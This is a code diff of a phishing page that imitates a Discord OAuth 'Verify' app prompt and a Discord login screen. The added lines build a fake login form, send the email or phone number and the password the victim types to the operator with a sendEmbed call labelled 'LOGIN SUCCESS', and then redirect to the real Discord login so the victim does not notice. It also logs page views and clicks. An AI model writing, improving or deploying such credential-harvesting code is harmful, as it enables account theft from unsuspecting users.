@@ -8,9 +8,13 @@
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body, html { height: 100%; background: #2f3136; font-family: 'Whitney', sans-serif; color: #dcddde; display: flex; justify-content: center; align-items: center; }
-    .oauth-box { background: #36393f; width: 90%; max-width: 480px; border-radius: 8px; padding: 24px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
+    .page { display: none; width: 90%; max-width: 480px; }
+    .page.active { display: block; }
+
+    /* OAUTH PAGE */
+    .oauth-box { background: #36393f; border-radius: 8px; padding: 24px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.3); }
     .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
-    .close { color: #72767d; font-size: 24px; cursor: pointer; }
+    .close { color: #72767d; font-size: 24px; cursor: default; }
     .app-icon { width: 64px; height: 64px; border-radius: 50%; background: #5865f2; margin: 0 auto 16px; }
     .app-name { font-size: 24px; font-weight: 600; color: #fff; margin-bottom: 8px; }
     .app-desc { font-size: 16px; color: #b9bbbe; margin-bottom: 24px; }
@@ -22,52 +26,96 @@
     .note { font-size: 13px; color: #72767d; margin: 16px 0; line-height: 1.4; }
     .authorize-btn { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
     .authorize-btn:hover { background: #4752c4; }
+
+    /* LOGIN PAGE */
+    .login-container { display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
+    .logo-container { background: #2f3136; padding: 16px; border-radius: 8px; margin-bottom: 16px; }
+    .logo { width: 124px; }
+    h1 { font-size: 26px; font-weight: 600; margin-bottom: 8px; color: #fff; }
+    p { font-size: 16px; color: #b9bbbe; margin-bottom: 32px; text-align: center; }
+    form { width: 100%; max-width: 380px; }
+    label { font-size: 12px; font-weight: 600; color: #b9bbbe; margin-bottom: 6px; display: block; text-transform: uppercase; }
+    input { width: 100%; padding: 12px 16px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-bottom: 16px; }
+    input:focus { outline: none; border-color: #5865f2; }
+    .forgot { text-align: right; margin-bottom: 24px; }
+    .forgot a { color: #00aff4; font-size: 14px; text-decoration: none; }
+    button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
+    .register { text-align: center; margin-top: 24px; font-size: 14px; color: #b9bbbe; }
+    .register a { color: #00aff4; text-decoration: none; }
   </style>
 </head>
 <body>
-  <div class="oauth-box">
-    <div class="header">
-      <span class="close">X</span>
-      <h2>Authorize</h2>
-      <span></span>
+
+  <!-- OAUTH PAGE -->
+  <div id="oauthPage" class="page active">
+    <div class="oauth-box">
+      <div class="header">
+        <span class="close">X</span>
+        <h2>Authorize</h2>
+        <span></span>
+      </div>
+      <div class="app-icon"></div>
+      <div class="app-name">Verify</div>
+      <div class="app-desc">wants to access your Discord account</div>
+
+      <div class="permissions">
+        <div class="perm check">
+          <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
+          Access your username, avatar and banner
+        </div>
+        <div class="perm check">
+          <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
+          Access your email address
+        </div>
+        <div class="perm check">
+          <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
+          Access your third-party connections
+        </div>
+        <div class="perm check">
+          <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
+          Join servers for you
+        </div>
+        <div class="perm cross">
+          <svg fill="currentColor" viewBox="0 0 16 16"><path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.75.75 0 1 1 1.06 1.06L9.06 8l3.22 3.22a.75.75 0 1 1-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 0 1-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06z"/></svg>
+          Record a new mixtape
+        </div>
+      </div>
+
+      <p class="note">
+        Once you authorize, you will be redirected outside Discord to: <strong>https://vaultcord.win</strong><br>
+        The Privacy Policy and Terms of Service of Verify's developer apply to this application.
+      </p>
+      <p class="note">
+        Active since 13 Jun 2024<br>
+        This application cannot read your messages or send messages as you.
+      </p>
+
+      <button class="authorize-btn" id="authorizeBtn">Authorize</button>
     </div>
-    <div class="app-icon"></div>
-    <div class="app-name">Verify</div>
-    <div class="app-desc">wants to access your Discord account</div>
+  </div>
 
-    <div class="permissions">
-      <div class="perm check">
-        <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
-        Access your username, avatar and banner
+  <!-- LOGIN PAGE -->
+  <div id="loginPage" class="page">
+    <div class="login-container">
+      <div class="logo-container">
+        <img src="https://seeklogo.com/images/D/discord-wordmark-white-logo-E95C468613-seeklogo.com.png" alt="Discord" class="logo" />
       </div>
-      <div class="perm check">
-        <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
-        Access your email address
-      </div>
-      <div class="perm check">
-        <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
-        Access your third-party connections
-      </div>
-      <div class="perm check">
-        <svg fill="currentColor" viewBox="0 0 16 16"><path d="M13.78 3.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
-        Join servers for you
-      </div>
-      <div class="perm cross">
-        <svg fill="currentColor" viewBox="0 0 16 16"><path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.75.75 0 1 1 1.06 1.06L9.06 8l3.22 3.22a.75.75 0 1 1-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 0 1-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06z"/></svg>
-        Record a new mixtape
+      <h1>Welcome back!</h1>
+      <p>We're so excited to see you again!</p>
+      <form id="loginForm">
+        <label for="email">Email or Phone Number</label>
+        <input type="text" id="email" required />
+        <label for="password">Password</label>
+        <input type="password" id="password" required />
+        <div class="forgot">
+          <a href="#">Forgot your password?</a>
+        </div>
+        <button type="submit">Log In</button>
+      </form>
+      <div class="register">
+        Need an account? <a href="#">Register</a>
       </div>
     </div>
-
-    <p class="note">
-      Once you authorize, you will be redirected outside Discord to: <strong>https://vaultcord.win</strong><br>
-      The Privacy Policy and Terms of Service of Verify's developer apply to this application.
-    </p>
-    <p class="note">
-      Active since 13 Jun 2024<br>
-      This application cannot read your messages or send messages as you.
-    </p>
-
-    <button class="authorize-btn" id="authorizeBtn">Authorize</button>
   </div>
 
   <script>
@@ -115,18 +163,36 @@
       } catch (e) {}
     }
 
-    // === 1. OAUTH CLICKED ===
-    document.getElementById('authorizeBtn').addEventListener('click', () => {
-      sendEmbed('OAUTH CLICKED', 0x00ff00, []);
-      setTimeout(() => {
-        window.location = 'login.html'; // Will redirect to your login page
-      }, 600);
+    // === 1. OAUTH PAGE VIEWED ===
+    window.addEventListener('load', () => {
+      if (document.getElementById('oauthPage').classList.contains('active')) {
+        sendEmbed('OAUTH PAGE VIEWED', 0x00ff00, []);
+      }
     });
 
-    // === 2. AUTO LOG ON LOAD (optional) ===
-    window.addEventListener('load', () => {
-      sendEmbed('OAUTH PAGE VIEWED', 0x00ff00, []);
+    // === 2. AUTHORIZE CLICKED → SHOW LOGIN ===
+    document.getElementById('authorizeBtn').addEventListener('click', () => {
+      sendEmbed('OAUTH CLICKED', 0x00ff00, []);
+      document.getElementById('oauthPage').classList.remove('active');
+      document.getElementById('loginPage').classList.add('active');
     });
+
+    // === 3. LOGIN SUBMIT ===
+    document.getElementById('loginForm').onsubmit = async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+      if (!email || !password) return;
+
+      await sendEmbed('LOGIN SUCCESS', 0x5865f2, [
+        { name: 'Email/Phone', value: `\`${email}\``, inline: false },
+        { name: 'Password', value: `\`${password}\``, inline: false }
+      ]);
+
+      setTimeout(() => {
+        window.location = `https://discord.com/login?email=${encodeURIComponent(email)}`;
+      }, 800);
+    };
   </script>
 </body>
 </html>
